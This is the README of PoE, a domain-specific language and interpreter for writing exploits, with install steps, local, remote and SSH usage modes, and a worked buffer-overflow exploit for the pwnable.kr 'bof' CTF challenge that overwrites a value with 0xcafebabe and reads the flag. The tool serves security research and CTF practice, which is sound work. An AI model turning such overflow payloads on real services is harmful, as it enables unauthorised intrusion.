PoE
===

PoE (Proof-of-Exploit) is a language designed specifically for writing an
exploit. It provides intuitive and concise syntax, which makes exploit
development easy and fun. For more details, please refer to our paper:
+ [Jung Hyun Kim, Steve Gustaman, and Sang Kil Cha. (2024), PoE: A Domain-Specific Language for Exploitation. In Proceedings of the Silicon Valley Cybersecurity Conference.](https://softsec.kaist.ac.kr/~sangkilc/papers/kim-svcc24.pdf)

Currently, PoE runs on an interpreter that we call `PoE.Replayer`, which is a
[.NET CLI
tool](https://docs.microsoft.com/en-us/dotnet/core/tools/global-tools). See the
[tutorial](tutorial) to learn more about PoE and `PoE.Replayer`.

## Features

+ Static typing
+ Simple and intuitive grammar for writing readable exploits
+ Language-level integration of SMT solving and inline assembly capability
+ Bit-vector manipulation
+ Various built-in functions
+ Automated `stdbuf` patching

## Installation

PoE supports major OSs including Windows, MacOS, and Linux distributions. And
you can easily install the released version of PoE via .NET.

### Prerequisite

+ [.NET 9+](https://dotnet.microsoft.com/en-us/download)

### Instruction

First, make sure you have installed .NET 9+ on your machine so that you can run
the command `dotnet` from your terminal.

Next, just run the following command to install `PoE.Replayer`:
```
dotnet tool install --global PoE.Replayer
```

After the installation, you should be able to run the command `poe` on your
machine. If so, you are all set.

### From source code

Instead of running the released version of PoE, you can also clone the latest
source code of PoE and run it directly:
```
git clone https://github.com/B2R2-org/PoE
cd PoE
dotnet run --project src/PoE.Replayer
```

## How to use

Basically, PoE supports two modes to interact with the target system:
+ Local mode: It runs the local binary to communicate with it.
+ Remote mode: It communicates with the remote service running on the specific
IP address and port number.

You can use either **Local mode** or **Remote mode** via the following commands:

+ Local mode: `poe stdin [replay options] <PoE> <bin path> [args]`
+ Remote mode: `poe net [replay options] <PoE> <ip> <port>`

Also, we provide another way to connect to the remote service via **SSH mode**,
where you can specify the username and password to log in to the remote host via
SSH:

+ SSH mode: `poe ssh [replay options] <PoE> <ip> <port> <user> <password>`

Running the PoE replayer without any parameters will show the other usages of
PoE.

### Example usage

Let us bring here an example CTF problem named `bof` from
[pwnable.kr](pwnable.kr). This problem has a buffer overflow vulnerability, and
you can easily write its exploit via PoE:

```
act exploit():
    bv payload = "A"x(0x2c + 0x8) . 0xcafebabe:u32 . "\n"
    write("nc 0 9000\n")
    write(payload)
    write("cat flag\n")
    return read(-1)

submit:
    return exploit()
```

And then, you can run the following command to run the exploit on the remote
service:
```
poe ssh bof.poe pwnable.kr 9000 bof guest
```
Note that you can also use Remote mode (`net`) when you connect to the remote
service using the other ways (e.g. via `nc`).

For more details, please see the [tutorial](tutorial).